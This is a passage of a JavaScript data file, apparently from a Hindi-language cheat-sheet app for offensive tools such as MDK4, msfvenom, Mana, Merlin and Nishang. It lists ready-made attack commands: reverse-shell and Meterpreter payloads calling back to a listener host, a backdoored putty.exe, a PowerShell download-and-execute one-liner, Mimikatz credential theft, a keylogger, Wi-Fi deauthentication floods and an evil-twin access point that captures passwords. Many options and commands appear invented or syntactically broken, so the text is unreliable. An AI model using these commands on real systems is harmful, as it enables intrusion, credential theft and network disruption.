    script: "airmon-ng start wlan0\nairodump-ng wlan0mon -w /tmp/scan --output-format csv &\nAID=$!\nsleep 30\nkill $AID\nawk -F',' '{print $1}' /tmp/scan-01.csv | tail -n +3 | head -20 > /tmp/bssids.txt\nmdk3 wlan0mon -d -b /tmp/bssids.txt -s 300 2>&1 | tee /tmp/mdk3_attack.log\necho 'MDK3 अटैक पूर्ण'"
  },
  MDK4: {
    install: { pkg: "mdk4" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-c <ch>", "चैनल"],
      ["-b <file>", "BSSID फ़ाइल"],
      ["-s <rate>", "पैकेट दर"],
      ["-v", "वर्बोज़"],
      ["-e <ssid>", "SSID"],
      ["-m <mode>", "मोड"],
      ["-p <file>", "PCAP फ़ाइल"],
      ["-f", "फ़्लड मोड"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "mdk4 wlan0mon b -b bssids.txt", desc: "बीकन फ़्लड मोड" },
      { cmd: "mdk4 wlan0mon d -b bssids.txt", desc: "डीऑथ मोड" },
      { cmd: "mdk4 wlan0mon a -b bssids.txt", desc: "AMOK मोड" },
      { cmd: "mdk4 wlan0mon e -c 6 -n FreeWiFi", desc: "एसोसिएशन फ़्लड" },
      { cmd: "mdk4 wlan0mon m -b bssids.txt", desc: "माइकल फ़्लड" },
      { cmd: "mdk4 wlan0mon b -c 6 -s 500", desc: "500 pps बीकन फ़्लड" },
      { cmd: "mdk4 wlan0mon d -b bssids.txt -v", desc: "वर्बोज़ डीऑथ" },
      { cmd: "mdk4 wlan0mon p -r capture.pcap", desc: "PCAP रीप्ले" },
      { cmd: "mdk4 wlan0mon b -c 1 -n TestNet", desc: "TestNet बीकन" },
      { cmd: "mdk4 wlan0mon e -c 11 -s 1000", desc: "1000/सेकंड एसोसिएशन" }
    ],
    advanced: [
      { cmd: "mdk4 wlan0mon d -b bssids.txt -s 1000 -v 2>&1 | tee mdk4.log", desc: "1000 pps डीऑथ लॉग" },
      { cmd: "mdk4 wlan0mon a -b bssids.txt && mdk4 wlan0mon m -b bssids.txt", desc: "AMOK फिर माइकल अटैक" },
      { cmd: "for ch in 1 6 11; do mdk4 wlan0mon b -c $ch -b ap.txt; done", desc: "सभी चैनल बीकन" },
      { cmd: "airodump-ng wlan0mon -w /tmp/scan && mdk4 wlan0mon p -r /tmp/scan-01.cap", desc: "कैप्चर और रीप्ले" },
      { cmd: "mdk4 wlan0mon d -b bssids.txt -s 500 & && sleep 30 && pkill mdk4", desc: "30 सेकंड डीऑथ फ़्लड" }
    ],
    script: "airmon-ng start wlan0\nairodump-ng wlan0mon --bssid $BSSID -c $CH -w /tmp/capture &\nsleep 20\npkill airodump\nmdk4 wlan0mon d -b /tmp/capture-01.csv -s 500 2>&1 | tee /tmp/mdk4_attack.log\necho 'MDK4 अटैक समाप्त'"
  },
  MSFPayload: {
    install: { pkg: "msfpayload" },
    options: [
      ["-p <payload>", "पेलोड नाम"],
      ["LHOST=<host>", "लिसनर होस्ट"],
      ["LPORT=<port>", "लिसनर पोर्ट"],
      ["-f <format>", "आउटपुट प्रारूप"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-e <encoder>", "एन्कोडर"],
      ["-i <count>", "एन्कोड पुनरावृत्ति"],
      ["-a <arch>", "आर्किटेक्चर"],
      ["--platform <plat>", "प्लेटफ़ॉर्म"],
      ["--list", "सूची दिखाएँ"]
    ],
    basic: [
      { cmd: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf", desc: "Linux रिवर्स शेल" },
      { cmd: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe", desc: "Windows Meterpreter" },
      { cmd: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.bin", desc: "रॉ शेलकोड" },
      { cmd: "msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o app.apk", desc: "Android Meterpreter" },
      { cmd: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe", desc: "एन्कोडेड Meterpreter" },
      { cmd: "msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php", desc: "PHP Meterpreter" },
      { cmd: "msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o shell.py", desc: "Python Meterpreter" },
      { cmd: "msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf -o bind.elf", desc: "Linux बाइंड शेल" },
      { cmd: "msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=80 -f exe -o shell80.exe", desc: "पोर्ट 80 रिवर्स शेल" },
      { cmd: "msfvenom -p osx/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f macho -o shell.macho", desc: "macOS रिवर्स शेल" }
    ],
    advanced: [
      { cmd: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 10 -x /usr/share/windows-binaries/putty.exe -o putty_backdoor.exe", desc: "बैकडोर EXE एन्कोडेड" },
      { cmd: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw | base64", desc: "base64 शेलकोड" },
      { cmd: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f psh-reflection -o shell.ps1", desc: "PowerShell Meterpreter" },
      { cmd: "msfvenom --list payloads | grep 'windows/x64/meterpreter'", desc: "Windows x64 पेलोड सूची" },
      { cmd: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe | msf-vbrutify", desc: "वीबीआरयूटी फ़ाई" }
    ],
    script: "echo 'MSF पेलोड जनरेट हो रहा है...'\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -x putty.exe -o /tmp/payload.exe 2>/dev/null\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o /tmp/shell.elf 2>/dev/null\necho 'पेलोड बनाए गए:/tmp/'"
  },
  ManaToolkit: {
    install: { pkg: "mana-toolkit" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-e <ssid>", "SSID"],
      ["-c <ch>", "चैनल"],
      ["-u", "अपस्ट्रीम"],
      ["-p <file>", "PCAP आउटपुट"],
      ["-o <file>", "लॉग फ़ाइल"],
      ["-v", "वर्बोज़"],
      ["-s", "साइलेंट"],
      ["-m <mac>", "MAC"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "mana -i wlan0 -e FreeWiFi", desc: "एविल ट्विन AP बनाएँ" },
      { cmd: "mana -i wlan0 -e FreeWiFi -c 6", desc: "चैनल 6 पर एविल ट्विन" },
      { cmd: "mana -i wlan0 -e FreeWiFi -u eth0", desc: "अपस्ट्रीम इंटरफ़ेस" },
      { cmd: "mana -i wlan0 -e FreeWiFi -p capture.pcap", desc: "PCAP कैप्चर" },
      { cmd: "mana -i wlan0 -e FreeWiFi -v", desc: "वर्बोज़ मोड" },
      { cmd: "mana -i wlan0 -e CorpHotspot -c 11 -u eth0", desc: "कॉर्पोरेट एविल ट्विन" },
      { cmd: "mana -i wlan0 -e FreeWiFi -o /var/log/mana.log", desc: "लॉग फ़ाइल" },
      { cmd: "mana -i wlan0 -e FreeWiFi -s", desc: "साइलेंट मोड" },
      { cmd: "mana -i wlan1 -e GuestNetwork -c 1", desc: "दूसरे इंटरफ़ेस" },
      { cmd: "mana -i wlan0 -e FreeWiFi -m 00:11:22:33:44:55", desc: "कस्टम MAC" }
    ],
    advanced: [
      { cmd: "mana -i wlan0 -e FreeWiFi -u eth0 -p capture.pcap -v 2>&1 | tee mana.log", desc: "पूर्ण एविल ट्विन लॉग" },
      { cmd: "mana -i wlan0 -e FreeWiFi & && tcpdump -i eth0 -w upstream.pcap", desc: "अपस्ट्रीम कैप्चर" },
      { cmd: "mana -i wlan0 -e FreeWiFi -v 2>&1 | grep -i 'assoc\\|connect\\|auth'", desc: "क्लाइंट कनेक्शन मॉनिटर" },
      { cmd: "for ssid in 'FreeWiFi' 'Guest' 'Corp'; do mana -i wlan0 -e $ssid -c 6; done", desc: "एकाधिक SSID मैना" },
      { cmd: "mana -i wlan0 -e FreeWiFi -v 2>&1 | awk '/GET|POST|password/{print}'", desc: "क्रेडेंशियल फ़िल्टर" }
    ],
    script: "echo 'Mana Toolkit शुरू...'\necho 1 > /proc/sys/net/ipv4/ip_forward\niptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000\nmana -i wlan0 -e FreeWiFi -u eth0 -p /tmp/mana.pcap -v 2>&1 | tee /tmp/mana.log"
  },
  Maskprocessor: {
    install: { pkg: "maskprocessor" },
    options: [
      ["-i <iface>", "इंटरफ़ेस नहीं"],
      ["--help", "सहायता"],
      ["<mask>", "मास्क पैटर्न"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-l <min>", "न्यूनतम लंबाई"],
      ["-u <max>", "अधिकतम लंबाई"],
      ["-c <charset>", "कस्टम चारसेट"],
      ["-q", "शांत"],
      ["-v", "वर्बोज़"],
      ["-t <type>", "प्रकार"]
    ],
    basic: [
      { cmd: "mp64 '?l?l?l?l' -o 4letter.txt", desc: "4 अक्षर लोअरकेस शब्द" },
      { cmd: "mp64 '?d?d?d?d?d?d' -o 6digit.txt", desc: "6 अंकों के PIN" },
      { cmd: "mp64 '?u?l?l?l?d?d' -o passwords.txt", desc: "पासवर्ड पैटर्न" },
      { cmd: "mp64 '?l?l?l?l?l?l?l?l' -o 8letter.txt", desc: "8 अक्षर शब्द" },
      { cmd: "mp64 '?d?d?d?d?d?d?d?d' -o 8digit.txt", desc: "8 अंक PIN" },
      { cmd: "mp64 '?u?l?l?l?l?l' -o mix.txt", desc: "अपरकेस + लोअरकेस" },
      { cmd: "mp64 '?a?a?a?a' -o all.txt", desc: "सभी कैरेक्टर 4 लंबाई" },
      { cmd: "mp64 '?u?u?u?d?d?d' -o pattern.txt", desc: "3 अपर + 3 अंक" },
      { cmd: "mp64 '?l?l?l?l?l?l?d?d' -o 8char.txt", desc: "6 अक्षर + 2 अंक" },
      { cmd: "mp64 '?d?d?d?d' -l 4 -u 8", desc: "4-8 अंकों की रेंज" }
    ],
    advanced: [
      { cmd: "mp64 '?u?l?l?l?d?d?d' -o words.txt 2>&1 | tee mp64.log", desc: "पासवर्ड जनरेशन लॉग" },
      { cmd: "mp64 '?l?l?l?l' 2>&1 | wc -l", desc: "4 अक्षर कुल गिनती" },
      { cmd: "mp64 -1 '?l?d' '?1?1?1?1?1?1' -o custom.txt", desc: "कस्टम चारसेट" },
      { cmd: "for len in 4 5 6 7 8; do mp64 '?d'$(printf '?d%.0s' $(seq 2 $len)) -o ${len}digit.txt; done", desc: "सभी लंबाई अंक" },
      { cmd: "mp64 '?u?l?l?l?l?l?l' | head -1000 > top_1000_pass.txt", desc: "पहले 1000 पासवर्ड" }
    ],
    script: "echo 'वर्डलिस्ट जनरेट हो रही है...'\nmp64 '?l?l?l?l?l?l?d?d' -o /tmp/wordlist_6l2d.txt 2>/dev/null\nmp64 '?u?l?l?l?l?l?d?d?d' -o /tmp/wordlist_1u5l3d.txt 2>/dev/null\necho 'वर्डलिस्ट तैयार'"
  },
  Merlin: {
    install: { pkg: "merlin" },
    options: [
      ["-s <host>", "सर्वर होस्ट"],
      ["-p <port>", "सर्वर पोर्ट"],
      ["-l <host>", "लिसनर होस्ट"],
      ["-P <port>", "लिसनर पोर्ट"],
      ["-r <file>", "रीसोर्स फ़ाइल"],
      ["-v", "वर्बोज़"],
      ["-d <domain>", "डोमेन फ़्रंट"],
      ["-t <type>", "परिवहन प्रकार"],
      ["-k <file>", "सर्टिफ़िकेट"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "merlinServer -s 0.0.0.0 -p 443", desc: "Merlin C2 सर्वर" },
      { cmd: "merlinServer -s 0.0.0.0 -p 443 -k cert.pem", desc: "SSL सर्टिफ़िकेट के साथ" },
      { cmd: "merlinAgent -url https://example.com:443 -v", desc: "Merlin एजेंट कनेक्ट" },
      { cmd: "merlinServer -s 0.0.0.0 -p 80 -d example.com", desc: "डोमेन फ़्रंट C2" },
      { cmd: "merlinServer -s 0.0.0.0 -p 443 -v", desc: "वर्बोज़ C2 सर्वर" },
      { cmd: "merlinAgent -url http://192.168.1.10:80 -v", desc: "HTTP एजेंट" },
      { cmd: "merlinServer -r /etc/merlin/config.json", desc: "कॉन्फ़िग फ़ाइल से" },
      { cmd: "merlinAgent -url https://example.com -t http2", desc: "HTTP/2 एजेंट" },
      { cmd: "merlinServer -s 0.0.0.0 -p 8443", desc: "पोर्ट 8443 C2" },
      { cmd: "merlinAgent -url wss://example.com:443", desc: "WebSocket एजेंट" }
    ],
    advanced: [
      { cmd: "merlinServer -s 0.0.0.0 -p 443 -k cert.pem -v 2>&1 | tee merlin.log", desc: "C2 सर्वर लॉग" },
      { cmd: "merlinServer -s 0.0.0.0 -p 443 -d example.com -v 2>&1 | grep -i 'agent\\|session'", desc: "एजेंट कनेक्शन मॉनिटर" },
      { cmd: "merlinAgent -url https://example.com -v 2>&1 | grep -i 'error\\|connect'", desc: "एजेंट एरर मॉनिटर" },
      { cmd: "merlinServer -r config.json && for i in 1 2 3; do merlinAgent -url https://$i.example.com; done", desc: "एकाधिक एजेंट" },
      { cmd: "merlinServer -s 0.0.0.0 -p 443 -t h2c 2>&1", desc: "HTTP/2 ClearText" }
    ],
    script: "echo 'Merlin C2 शुरू...'\nmerlinServer -s 0.0.0.0 -p 443 -k /etc/merlin/cert.pem -v 2>&1 | tee /var/log/merlin.log &\nsleep 3\necho 'Merlin C2 पोर्ट 443 पर चल रहा है'"
  },
  Metagoofil: {
    install: { pkg: "metagoofil" },
    options: [
      ["-d <domain>", "लक्ष्य डोमेन"],
      ["-t <type>", "फ़ाइल प्रकार"],
      ["-l <limit>", "परिणाम सीमा"],
      ["-o <dir>", "आउटपुट डायरेक्टरी"],
      ["-f <file>", "रिपोर्ट फ़ाइल"],
      ["-n <limit>", "डाउनलोड सीमा"],
      ["-e <delay>", "विलंब सेकंड"],
      ["-s", "साइलेंट"],
      ["-v", "वर्बोज़"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "metagoofil -d example.com -t pdf -l 50", desc: "PDF मेटाडेटा खोजें" },
      { cmd: "metagoofil -d example.com -t doc,pdf,xls -l 100 -o /tmp/metadata", desc: "दस्तावेज़ मेटाडेटा" },
      { cmd: "metagoofil -d example.com -f report.html", desc: "HTML रिपोर्ट" },
      { cmd: "metagoofil -d example.com -t pdf -n 20", desc: "20 PDF डाउनलोड" },
      { cmd: "metagoofil -d example.com -t pdf -l 200 -e 2", desc: "2 सेकंड विलंब" },
      { cmd: "metagoofil -d example.com -t doc -l 50 -o /output", desc: "DOC मेटाडेटा" },
      { cmd: "metagoofil -d example.com -t pdf -v", desc: "वर्बोज़ मोड" },
      { cmd: "metagoofil -d example.com -t xls,pdf,doc -l 100", desc: "एकाधिक प्रकार" },
      { cmd: "metagoofil -d example.com -s -o /tmp/docs", desc: "साइलेंट डाउनलोड" },
      { cmd: "metagoofil -d example.com -t pdf -l 50 -f report.pdf", desc: "PDF रिपोर्ट जनरेट" }
    ],
    advanced: [
      { cmd: "metagoofil -d example.com -t pdf,doc,xls -l 200 -o /tmp/files -v 2>&1 | tee metagoofil.log", desc: "पूर्ण मेटाडेटा स्कैन लॉग" },
      { cmd: "metagoofil -d example.com -t pdf -l 50 -o /tmp && exiftool /tmp/*.pdf | grep -i 'author\\|creator'", desc: "PDF लेखक जानकारी" },
      { cmd: "for type in pdf doc xls ppt; do metagoofil -d example.com -t $type -l 50 -o /tmp/$type; done", desc: "सभी प्रकार फ़ाइलें" },
      { cmd: "metagoofil -d example.com -t pdf -l 500 -e 1 -v 2>&1 | grep -i 'found\\|download'", desc: "मिली फ़ाइलें मॉनिटर" },
      { cmd: "metagoofil -d example.com -t pdf -o /tmp && strings /tmp/*.pdf | grep -i 'password\\|user'", desc: "PDF स्ट्रिंग विश्लेषण" }
    ],
    script: "echo 'मेटाडेटा संग्रह शुरू...'\nmetagoofil -d example.com -t pdf,doc,xls,ppt -l 100 -o /tmp/metagoofil_output -v 2>&1 | tee /tmp/meta.log\necho 'मेटाडेटा डाउनलोड पूर्ण'"
  },
  Mkbootimg: {
    install: { pkg: "mkbootimg" },
    options: [
      ["--kernel <file>", "कर्नेल फ़ाइल"],
      ["--ramdisk <file>", "रैमडिस्क फ़ाइल"],
      ["--cmdline <str>", "कमांड लाइन"],
      ["--base <addr>", "बेस एड्रेस"],
      ["--pagesize <size>", "पेज साइज़"],
      ["--offset <off>", "रैमडिस्क ऑफ़सेट"],
      ["--dt <file>", "डिवाइस ट्री"],
      ["--output <file>", "आउटपुट फ़ाइल"],
      ["--header <ver>", "हेडर वर्ज़न"],
      ["-o <file>", "आउटपुट फ़ाइल"]
    ],
    basic: [
      { cmd: "mkbootimg --kernel kernel.img --ramdisk ramdisk.img -o boot.img", desc: "बूट इमेज बनाएँ" },
      { cmd: "mkbootimg --kernel zImage --ramdisk initrd.img --base 0x80000000 -o boot.img", desc: "बेस एड्रेस के साथ" },
      { cmd: "mkbootimg --kernel kernel.img --ramdisk ramdisk.img --cmdline 'console=ttyS0' -o boot.img", desc: "कमांड लाइन के साथ" },
      { cmd: "mkbootimg --kernel kernel.img --ramdisk ramdisk.img --pagesize 2048 -o boot.img", desc: "2K पेज साइज़" },
      { cmd: "mkbootimg --kernel kernel.img --ramdisk ramdisk.img --dt dt.img -o boot.img", desc: "डिवाइस ट्री के साथ" },
      { cmd: "mkbootimg --kernel zImage --ramdisk ramdisk.img --header-version 2 -o boot.img", desc: "हेडर वर्ज़न 2" },
      { cmd: "mkbootimg --kernel kernel.img --ramdisk ramdisk.img --base 0x80000000 --pagesize 4096 -o boot.img", desc: "पूर्ण पैरामीटर" },
      { cmd: "mkbootimg --kernel kernel.img --ramdisk ramdisk.img --offset 0x1000000 -o boot.img", desc: "रैमडिस्क ऑफ़सेट" },
      { cmd: "unpackbootimg -i boot.img", desc: "बूट इमेज अनपैक" },
      { cmd: "mkbootimg --kernel zImage --ramdisk ramdisk.img --base 0x40000000 -o recovery.img", desc: "रिकवरी इमेज" }
    ],
    advanced: [
      { cmd: "mkbootimg --kernel zImage --ramdisk ramdisk.img --dt dt.img --base 0x80000000 --pagesize 2048 --cmdline 'androidboot.hardware=qcom' -o boot.img 2>&1 | tee mkboot.log", desc: "पूर्ण बूट इमेज लॉग" },
      { cmd: "unpackbootimg -i boot.img && mkbootimg --kernel boot.img-kernel --ramdisk boot.img-ramdisk.gz -o new_boot.img", desc: "अनपैक और रीपैक" },
      { cmd: "abootimg -x boot.img && mkbootimg --kernel zImage --ramdisk initrd.img -o custom_boot.img", desc: "abootimg करें और mkbootimg" },
      { cmd: "for base in 0x80000000 0x40000000 0x20000000; do mkbootimg --kernel kernel.img --ramdisk ramdisk.img --base $base -o boot_$base.img; done", desc: "एकाधिक बेस एड्रेस" },
      { cmd: "mkbootimg --kernel zImage --ramdisk ramdisk.img --base 0x80000000 -o boot.img && sha256sum boot.img", desc: "बूट इमेज और हैश" }
    ],
    script: "unpackbootimg -i stock_boot.img\ncp stock_boot.img-kernel /tmp/kernel\n# रैमडिस्क मॉडिफ़ाई\nmkdir /tmp/ramdisk && cd /tmp/ramdisk\ngzip -dc ../stock_boot.img-ramdisk.gz | cpio -idm\n# मॉडिफ़िकेशन के बाद\nfind . | cpio -o -H newc | gzip > ../new_ramdisk.gz\nmkbootimg --kernel ../kernel --ramdisk ../new_ramdisk.gz --base 0x80000000 -o ../modified_boot.img"
  },
  NBTScan: {
    install: { pkg: "nbtscan" },
    options: [
      ["-r", "रीकर्सिव मोड"],
      ["-v", "वर्बोज़"],
      ["-s", "साइलेंट"],
      ["-f <file>", "लक्ष्य फ़ाइल"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-p <port>", "पोर्ट"],
      ["-t <time>", "टाइमआउट"],
      ["-m", "MAC दिखाएँ"],
      ["-4", "IPv4"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "nbtscan 192.168.1.0/24", desc: "सबनेट NetBIOS स्कैन" },
      { cmd: "nbtscan -r 192.168.1.0/24", desc: "रीकर्सिव NetBIOS स्कैन" },
      { cmd: "nbtscan 192.168.1.1", desc: "एकल होस्ट स्कैन" },
      { cmd: "nbtscan -v 192.168.1.0/24", desc: "वर्बोज़ NetBIOS स्कैन" },
      { cmd: "nbtscan -f targets.txt -o results.txt", desc: "फ़ाइल से लक्ष्य स्कैन" },
      { cmd: "nbtscan -m 192.168.1.0/24", desc: "MAC पते के साथ" },
      { cmd: "nbtscan -t 10 192.168.1.0/24", desc: "10 सेकंड टाइमआउट" },
      { cmd: "nbtscan -s 192.168.1.0/24", desc: "साइलेंट मोड" },
      { cmd: "nbtscan -p 137 192.168.1.1", desc: "पोर्ट 137 पर स्कैन" },
      { cmd: "nbtscan -r -v -m 10.0.0.0/24", desc: "पूर्ण रीकर्सिव स्कैन" }
    ],
    advanced: [
      { cmd: "nbtscan -r -v -m 192.168.1.0/24 2>&1 | tee nbtscan.log", desc: "पूर्ण NetBIOS स्कैन लॉग" },
      { cmd: "nbtscan -f ip_list.txt 2>&1 | grep -i '\\\\\\bSHARE\\|\\\\\\bSERVER'", desc: "सर्वर और शेयर फ़िल्टर" },
      { cmd: "for ip in $(seq 1 254); do nbtscan -s 192.168.1.$ip; done > /dev/null", desc: "लूप से सबनेट स्कैन" },
      { cmd: "nbtscan -r 192.168.1.0/24 -o nbtscan.txt && awk '{print $1}' nbtscan.txt | sort -u", desc: "अद्वितीय IP निकालें" },
      { cmd: "nmap -sU -p 137 192.168.1.0/24 -oG - | grep 'open' | awk '{print $2}' | xargs nbtscan", desc: "nmap से NetBIOS पाइप" }
    ],
    script: "echo 'NetBIOS स्कैन शुरू...'\nnbtscan -r -v -m 192.168.1.0/24 -o /tmp/nbtscan_results.txt 2>&1 | tee /tmp/nbtscan.log\ngrep 'SHARE\\|SERVER' /tmp/nbtscan_results.txt > /tmp/windows_shares.txt\necho 'NetBIOS स्कैन पूर्ण'"
  },
  Netsniffng: {
    install: { pkg: "netsniffng" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-o <file>", "आउटपुट PCAP"],
      ["-r <file>", "रीड PCAP"],
      ["-n <count>", "पैकेट गिनती"],
      ["-s <snaplen>", "स्नैपलेन"],
      ["-t", "प्रिंट टाइमस्टैम्प"],
      ["-p", "प्रॉमिस्क्युअस"],
      ["-v", "वर्बोज़"],
      ["-q", "शांत"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "netsniff-ng -i eth0 -o capture.pcap", desc: "पैकेट कैप्चर करें" },
      { cmd: "netsniff-ng -r capture.pcap", desc: "PCAP फ़ाइल रीड करें" },
      { cmd: "netsniff-ng -i eth0 -n 1000", desc: "1000 पैकेट कैप्चर" },
      { cmd: "netsniff-ng -i eth0 -o dump.pcap -s 65535", desc: "पूर्ण स्नैपलेन" },
      { cmd: "netsniff-ng -i eth0 -o out.pcap -t", desc: "टाइमस्टैम्प के साथ" },
      { cmd: "netsniff-ng -i wlan0 -o wifi.pcap", desc: "वायरलेस कैप्चर" },
      { cmd: "netsniff-ng -i eth0 -v", desc: "वर्बोज़ कैप्चर" },
      { cmd: "netsniff-ng -r capture.pcap -v", desc: "वर्बोज़ PCAP रीड" },
      { cmd: "netsniff-ng -i eth0 -o cap.pcap -q", desc: "शांत कैप्चर" },
      { cmd: "netsniff-ng -i eth0 -p -o promisc.pcap", desc: "प्रॉमिस्क्युअस कैप्चर" }
    ],
    advanced: [
      { cmd: "netsniff-ng -i eth0 -o capture.pcap -s 65535 -t -v 2>&1 | tee netsniff.log", desc: "पूर्ण कैप्चर लॉग" },
      { cmd: "netsniff-ng -i eth0 -n 10000 -o sample.pcap & && sleep 10 && pkill netsniff-ng", desc: "10 सेकंड नमूना कैप्चर" },
      { cmd: "netsniff-ng -r capture.pcap 2>&1 | awk '{print $3}' | sort | uniq -c | sort -rn", desc: "पैकेट प्रकार आँकड़े" },
      { cmd: "netsniff-ng -i eth0 -o - | tcpdump -r - -n -c 100", desc: "netsniff-ng से tcpdump पाइप" },
      { cmd: "for iface in eth0 wlan0 eth1; do netsniff-ng -i $iface -o ${iface}.pcap &; done; wait", desc: "एकाधिक इंटरफ़ेस कैप्चर" }
    ],
    script: "IFACE=${1:-eth0}\nPCAP_FILE=/tmp/capture_$(date +%Y%m%d_%H%M%S).pcap\necho 'कैप्चर शुरू:' $IFACE\nnetsniff-ng -i $IFACE -o $PCAP_FILE -s 65535 -t -v 2>&1 | tee ${PCAP_FILE}.log &\nCAPTURE_PID=$!\nsleep $2\nkill $CAPTURE_PID\necho 'कैप्चर समाप्त:' $PCAP_FILE"
  },
  Nishang: {
    install: { pkg: "nishang" },
    options: [
      ["-s <script>", "स्क्रिप्ट चुनें"],
      ["-r <host>", "रिमोट होस्ट"],
      ["-p <port>", "पोर्ट"],
      ["-c <cmd>", "कमांड"],
      ["-o <file>", "आउटपुट"],
      ["-e <encode>", "एन्कोडिंग"],
      ["-v", "वर्बोज़"],
      ["-t <type>", "पेलोड प्रकार"],
      ["-l", "लिस्टन"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "nishang -s Invoke-PowerShellTcp.ps1 -r 192.168.1.10 -p 4444", desc: "रिवर्स शेल स्क्रिप्ट" },
      { cmd: "nishang -s Invoke-Mimikatz.ps1 -o creds.txt", desc: "Mimikatz क्रेडेंशियल" },
      { cmd: "nishang -s Invoke-PortScan.ps1 -c 'Start-PortScan -StartAddress 192.168.1.1 -EndAddress 192.168.1.254'", desc: "PowerShell पोर्ट स्कैन" },
      { cmd: "nishang -s Invoke-Keylogger.ps1 -o keylog.txt", desc: "कीलॉगर शुरू करें" },
      { cmd: "nishang -s Invoke-Backdoor.ps1 -l -p 4444", desc: "बैकडोर लिसनर" },
      { cmd: "nishang -s Invoke-PowerShellTcpOneLine.ps1 -r 192.168.1.10 -p 4444", desc: "वन-लाइन रिवर्स शेल" },
      { cmd: "nishang -s Invoke-PsUACme.ps1", desc: "UAC बाईपास" },
      { cmd: "nishang -s Get-PassHashes.ps1", desc: "पासवर्ड हैश प्राप्त करें" },
      { cmd: "nishang -s Invoke-Shellcode.ps1 -c 'msfvenom पेलोड'", desc: "शेलकोड इंजेक्ट" },
      { cmd: "nishang -s Invoke-Persistence.ps1 -l -p 4444", desc: "पर्सिस्टेंस स्थापित करें" }
    ],
    advanced: [
      { cmd: "nishang -s Invoke-PowerShellTcp.ps1 -r 192.168.1.10 -p 4444 -v 2>&1 | tee nishang.log", desc: "Nishang रिवर्स शेल लॉग" },
      { cmd: "echo 'IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.1.10:8000/Invoke-PowerShellTcp.ps1\");Invoke-PowerShellTcp'", desc: "डाउनलोड और निष्पादित" },
      { cmd: "nishang -s Invoke-PortScan.ps1 -c 'Start-PortScan -StartAddress 192.168.1.1 -EndAddress 192.168.1.100 -ResolveHost'", desc: "पोर्ट स्कैन होस्ट रेज़ॉल्व" },
      { cmd: "nishang -s Invoke-Mimikatz.ps1 -o mimikatz_output.txt 2>&1 | grep -i 'password\\|hash'", desc: "Mimikatz पासवर्ड फ़िल्टर" },
      { cmd: "python3 -m http.server 8000 && nishang -s Invoke-PowerShellTcp.ps1 -r 192.168.1.10 -p 4444", desc: "HTTP सर्वर और रिवर्स शेल" }
    ],
    script: "echo 'Nishang पेलोड तैयार...'\necho 'Download: Invoke-PowerShellTcp.ps1'\necho 'Usage: powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString(\\\"http://192.168.1.10:8000/Invoke-PowerShellTcp.ps1\\\");Invoke-PowerShellTcp -IPAddress 192.168.1.10 -Port 4444\"'\npython3 -m http.server 8000"
  },
  OneGadget: {
    install: { pkg: "one-gadget" },
    options: [
      ["-l", "सभी गैजेट सूची"],
      ["-r <ver>", "रीलेज़ सर्च"],
      ["-f <file>", "libc फ़ाइल"],
      ["-s", "साइलेंट"],
      ["-v", "वर्बोज़"],
      ["-o <file>", "आउटपुट"],
      ["-b", "बाइनरी मोड"],
      ["-n", "नियर गैजेट"],
      ["-h", "सहायता"],
      ["-V", "संस्करण"]
    ],
    basic: [
      { cmd: "one_gadget /lib/x86_64-linux-gnu/libc.so.6", desc: "libc में one-gadget खोजें" },
      { cmd: "one_gadget -l /lib/i386-linux-gnu/libc.so.6", desc: "32-बिट libc गैजेट" },
      { cmd: "one_gadget -r 2.31 /lib/x86_64-linux-gnu/libc.so.6", desc: "रीलीज़ 2.31 गैजेट" },
      { cmd: "one_gadget -s /lib/x86_64-linux-gnu/libc.so.6", desc: "साइलेंट मोड" },
      { cmd: "one_gadget -v /lib/x86_64-linux-gnu/libc.so.6", desc: "वर्बोज़ आउटपुट" },
      { cmd: "one_gadget -o gadgets.txt /lib/x86_64-linux-gnu/libc.so.6", desc: "गैजेट फ़ाइल में सेव" },
      { cmd: "one_gadget -b /lib/x86_64-linux-gnu/libc.so.6", desc: "बाइनरी मोड" },
      { cmd: "one_gadget /usr/lib32/libc.so.6", desc: "32-बिट libc पथ" },
      { cmd: "one_gadget -n /lib/x86_64-linux-gnu/libc.so.6", desc: "नियर गैजेट दिखाएँ" },
